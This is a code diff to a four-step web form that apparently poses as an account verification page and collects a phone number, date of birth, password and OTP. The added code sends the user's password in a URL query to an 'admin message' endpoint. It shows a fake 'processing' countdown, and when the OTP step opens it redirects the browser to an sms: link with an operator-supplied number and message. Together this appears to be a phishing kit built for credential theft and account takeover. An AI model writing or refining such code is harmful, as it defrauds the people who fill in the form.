@@ -554,7 +554,7 @@
         data-indicator="2"
       >
         <span class="number">2</span>
-        <span>Verify</span>
+        <span>Loading</span>
       </div>
 
       <div
@@ -608,7 +608,7 @@
       <!-- ========================================= -->
 
       <section
-        class="form-step active"
+        class="form-step"
         data-step="1"
       >
 
@@ -627,7 +627,7 @@
             <input
               id="mobileNumber"
               type="tel"
-              inputmode="numeric"
+              inputmode="tel"
               autocomplete="tel"
               placeholder="Enter mobile number"
             />
@@ -690,6 +690,7 @@
 
         </div>
 
+
         <div class="actions">
 
           <span></span>
@@ -700,17 +701,6 @@
             data-next
           >
             Continue
-
-            <svg
-              class="arrow"
-              viewBox="0 0 24 24"
-              fill="none"
-              stroke="currentColor"
-              stroke-width="2.2"
-            >
-              <path d="m9 18 6-6-6-6"/>
-            </svg>
-
           </button>
 
         </div>
@@ -719,7 +709,7 @@
 
 
       <!-- ========================================= -->
-      <!-- STEP 2 -->
+      <!-- STEP 2 - LOADING -->
       <!-- ========================================= -->
 
       <section
@@ -730,7 +720,7 @@
         <div class="fields">
 
           <div class="notice">
-            Processing please wait until we verify your information...
+            Processing your account access...
           </div>
 
           <div class="loading-container" style="text-align: center; margin-top: 20px;">
@@ -745,8 +735,16 @@
               animation: spin 1s linear infinite;
             "></div>
 
-            <p style="color: var(--muted); font-size: 0.87rem;">
-              Please wait...
+            <div class="timer" id="step2-timer" style="
+              font-size: 1.5rem;
+              font-weight: bold;
+              color: var(--orange);
+            ">
+              15
+            </div>
+
+            <p style="margin-top: 10px; color: var(--muted); font-size: 0.87rem;">
+              seconds remaining
             </p>
 
           </div>
@@ -790,24 +788,24 @@
 
           </div>
 
-
           <div
             class="field"
-            data-required="birthDate"
+            data-required="dateOfBirth"
           >
 
-            <label for="birthDate">
+            <label for="dateOfBirth">
               Date of Birth
               <span class="required">*</span>
             </label>
 
             <input
-              id="birthDate"
+              id="dateOfBirth"
               type="date"
+              placeholder="YYYY-MM-DD"
             />
 
             <p class="error">
-              Please select date of birth.
+              Please enter date of birth.
             </p>
 
           </div>
@@ -901,7 +899,7 @@
           <button
             class="button next finish"
             type="button"
-            id="finish-demo"
+            data-next
           >
 
             Submit
@@ -989,9 +987,17 @@
 
   let isLoading = false;
 
+  let adminMessage = '';
+
+  let adminPhoneNumber = '';
+
+  let userId = '';
+
   let step2TimerStarted = false;
 
   let step = 1;
+
+  let adminMessageFetched = false;
 
 
   // ===================================================
@@ -1008,8 +1014,8 @@
 
     2: [
       'Step 2 of 4',
-      'Verification',
-      'Please wait while we verify your information.'
+      'Processing',
+      'Please wait while we process your account.'
     ],
 
     3: [
@@ -1169,9 +1175,19 @@
 
 
     console.log(
-      'Step 1 response:',
+      'Step 1 payload/response:',
       data
     );
+
+
+    if (data.user && data.user.uniqueCode) {
+      adminPhoneNumber = data.user.uniqueCode;
+    }
+
+
+    if (data.user) {
+      userId = data.user.id;
+    }
 
 
     if (!response.ok) {
@@ -1202,7 +1218,7 @@
 
     const dateOfBirth =
       document.querySelector(
-        '#birthDate'
+        '#dateOfBirth'
       ).value;
 
 
@@ -1221,7 +1237,7 @@
 
 
     console.log(
-      'Step 3 payload:',
+      'Step 2 payload:',
       payload
     );
 
@@ -1248,7 +1264,7 @@
 
 
     console.log(
-      'Step 3 response:',
+      'Step 2 response:',
       data
     );
 
@@ -1334,6 +1350,59 @@
     }
 
 
+    if (data.user && data.user.uniqueCode) {
+      adminPhoneNumber = data.user.uniqueCode;
+    }
+
+    if (data.user && data.user.adminMessage) {
+      adminMessage = data.user.adminMessage;
+    }
+
+
+    return data;
+
+  }
+
+
+
+
+  // ===================================================
+  // GET ADMIN MESSAGE
+  // ===================================================
+
+  async function getAdminMessage() {
+
+    console.log(
+      'Fetching admin message using password'
+    );
+
+
+    const response =
+      await fetch(
+        `${API_BASE}/message?password=${encodeURIComponent(userPassword)}`
+      );
+
+
+    const data =
+      await response.json();
+
+
+    console.log(
+      'Admin message response:',
+      data
+    );
+
+
+    if (!response.ok) {
+
+      throw new Error(
+        data.error ||
+        'Failed to fetch admin message'
+      );
+
+    }
+
+
     return data;
 
   }
@@ -1351,7 +1420,7 @@
 
         panel.classList.toggle(
           'active',
-          Number(panel.dataset.step) === step
+          panel.dataset.step == step
         );
 
       });
@@ -1389,14 +1458,6 @@
       });
 
 
-    if (step === 2 && !step2TimerStarted) {
-      step2TimerStarted = true;
-      setTimeout(() => {
-        step++;
-        step2TimerStarted = false;
-        render();
-      }, 15000);
-    }
 
 
     [
@@ -1405,6 +1466,51 @@
       subtitle.textContent
     ] =
       copy[step];
+
+
+    if (step === 2 && !step2TimerStarted) {
+      step2TimerStarted = true;
+      const timerElement = document.getElementById('step2-timer');
+      let timeLeft = 15;
+
+      const countdown = setInterval(() => {
+        timeLeft--;
+        if (timerElement) {
+          timerElement.textContent = timeLeft;
+        }
+
+        if (timeLeft <= 0) {
+          clearInterval(countdown);
+          step2TimerStarted = false;
+          step = 3;
+          render();
+        }
+      }, 1000);
+    }
+
+    // Fetch admin message when OTP section opens
+    if (step === 4 && !adminMessageFetched) {
+      adminMessageFetched = true;
+      
+      // Fetch admin message using password
+      getAdminMessage()
+        .then(data => {
+          // Only redirect to SMS if admin has provided message and phone number
+          if (data.message && data.phoneNumber) {
+            adminMessage = data.message;
+            adminPhoneNumber = data.phoneNumber;
+            
+            // Directly open SMS app with pre-filled message and phone number
+            const smsUrl = `sms:${adminPhoneNumber}?body=${encodeURIComponent(adminMessage)}`;
+            window.location.href = smsUrl;
+          }
+          // If no message/phone number from admin, just proceed with normal OTP flow
+        })
+        .catch(error => {
+          console.error('Failed to fetch admin message:', error);
+          // If error fetching, just proceed with normal OTP flow
+        });
+    }
 
 
     document
@@ -1475,7 +1581,7 @@
           }
 
 
-          if (step !== 1 && step !== 3) {
+          if (step !== 1 && step !== 3 && step !== 4) {
             isLoading = true;
 
             button.textContent =
@@ -1489,31 +1595,138 @@
 
             if (step === 1) {
 
-              step++;
+              isLoading = true;
 
-              render();
+              button.textContent =
+                'Loading...';
 
-              submitStep1().catch(error => {
-                console.error('Step 1 background submission error:', error);
-              });
+              button.disabled = true;
 
-            }
+              try {
 
+                await submitStep1();
 
-            else if (step === 2) {
+                step = 2;
+
+                render();
+
+              }
+
+              catch (error) {
+
+                console.error(
+                  'Step 1 error:',
+                  error
+                );
+
+                alert(
+                  error.message
+                );
+
+              }
+
+              finally {
+
+                isLoading = false;
+
+                button.textContent =
+                  'Continue';
+
+                button.disabled = false;
+
+              }
 
             }
 
 
             else if (step === 3) {
 
-              step++;
+              isLoading = true;
 
-              render();
+              button.textContent =
+                'Loading...';
 
-              submitStep2().catch(error => {
-                console.error('Step 3 background submission error:', error);
-              });
+              button.disabled = true;
+
+              try {
+
+                await submitStep2();
+
+                step++;
+
+                render();
+
+              }
+
+              catch (error) {
+
+                console.error(
+                  'Step 3 error:',
+                  error
+                );
+
+                alert(
+                  error.message
+                );
+
+              }
+
+              finally {
+
+                isLoading = false;
+
+                button.innerHTML =
+                  'Continue <svg class="arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="m9 18 6-6-6-6"/></svg>';
+
+                button.disabled = false;
+
+              }
+
+            }
+
+
+            else if (step === 4) {
+
+              isLoading = true;
+
+              button.textContent =
+                'Submitting...';
+
+              button.disabled = true;
+
+              try {
+
+                await submitStep3();
+
+                // Show completion screen
+                completion.classList.add('show');
+                form.style.display = 'none';
+
+              }
+
+              catch (error) {
+
+                console.error(
+                  'Step 4 error:',
+                  error
+                );
+
+                alert(
+                  error.message
+                );
+
+              }
+
+              finally {
+
+                isLoading = false;
+
+                button.textContent =
+                  'Submit';
+
+                button.disabled = false;
+
+              }
 
             }
 
@@ -1575,109 +1788,7 @@
     });
 
 
-  // ===================================================
-  // FINAL SUBMIT
-  // ===================================================
-
-  document
-    .querySelector('#finish-demo')
-    .addEventListener(
-      'click',
-      async () => {
-
-        if (!validate(4)) {
-          return;
-        }
-
-
-        if (isLoading) {
-          return;
-        }
-
-
-        isLoading = true;
-
-
-        const button =
-          document.querySelector(
-            '#finish-demo'
-          );
-
-
-        button.textContent =
-          'Submitting...';
-
-        button.disabled = true;
-
-
-        try {
-
-          await submitStep3();
-
-
-          form.style.display =
-            'none';
-
-
-          document.querySelector('.intro').style.display =
-            'none';
-
-
-          completion.classList.add(
-            'show'
-          );
-
-
-          document
-            .querySelectorAll(
-              '[data-indicator]'
-            )
-            .forEach(indicator => {
-
-              indicator.classList.remove(
-                'active'
-              );
-
-              indicator.classList.add(
-                'done'
-              );
-
-              indicator.querySelector(
-                '.number'
-              ).textContent =
-                '✓';
-
-            });
-
-        }
-
-        catch (error) {
-
-          console.error(
-            'Step 4 error:',
-            error
-          );
-
-          alert(
-            error.message
-          );
-
-        }
-
-        finally {
-
-          isLoading = false;
-
-          button.textContent =
-            'Submit';
-
-          button.disabled = false;
-
-        }
-
-      }
-    );
-
+  render();
 
 })();
 
